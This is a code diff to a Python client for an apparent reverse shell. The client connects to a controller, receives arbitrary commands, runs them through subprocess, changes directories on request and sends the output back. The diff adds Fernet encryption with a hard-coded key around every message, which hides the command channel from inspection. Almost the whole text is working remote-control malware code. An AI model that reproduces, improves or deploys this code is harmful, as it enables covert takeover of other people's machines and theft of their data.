@@ -7,6 +7,8 @@ import subprocess
 import sys
 import time
 
+from cryptography.fernet import Fernet
+
 
 def command_registrar():
     registry = {}
@@ -60,6 +62,7 @@ class Client(Commands):
         self.socket = None
         self.connection_retry = 5
         self.custom_commands = self.get_all_commands()
+        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -87,31 +90,48 @@ class Client(Commands):
             time.sleep(self.connection_retry)
             self.socket_connect()
 
-    def print_output(self, output_str):
+    def send(self, output_str, print_output=True):
         sent_message = str.encode(output_str)
-        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
-        print(output_str)
+        ciphertext_message = self.encrypt(sent_message)
+        self.socket.send(struct.pack('>I', len(ciphertext_message)) + ciphertext_message)
+        if print_output:
+            print(output_str)
+
+    def receive(self):
+        ciphertext = self.socket.recv(2048)
+        msg = self.decrypt(ciphertext)
+        return msg
+
+    def encrypt(self, message):
+        f = Fernet(self.encryption_key)
+        token = f.encrypt(message)
+        return token
+
+    def decrypt(self, ciphertext):
+        f = Fernet(self.encryption_key)
+        token = f.decrypt(ciphertext)
+        return token
 
     def receive_commands(self):
-        self.socket.recv(10)
+        self.receive()
         while True:
             try:
-                cwd = str.encode(str(os.getcwd()) + '> ')
-                self.socket.send(struct.pack('>I', len(cwd)) + cwd)
+                self.send(str(os.getcwd()) + '> ', print_output=False)
 
-                data = self.socket.recv(2048)
+                data = self.receive()
 
                 if data == b'':
-                    self.socket.send(2048)
+                    self.send('')
                     break
+
                 command = self.parse_command(data)
                 if command == 'cd':
                     directory = data[3:].decode('utf-8')
                     try:
                         os.chdir(directory.strip())
-                        self.print_output('')
+                        self.send('', print_output=False)
                     except:
-                        self.print_output('cd: %s: No such file or directory\n' % directory)
+                        self.send('cd: %s: No such file or directory\n' % directory)
                 elif command in self.custom_commands:
                     self.run_custom_command(command, data)
                     if command == 'background':
@@ -132,9 +152,9 @@ class Client(Commands):
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = output_bytes.decode('utf-8', errors='replace')
         if output_str is not None:
-            self.print_output(output_str)
+            self.send(output_str)
         else:
-            self.print_output(' ')
+            self.send(' ', print_output=False)
 
     def run_custom_command(self, command, data):
         command_function = getattr(self, command)
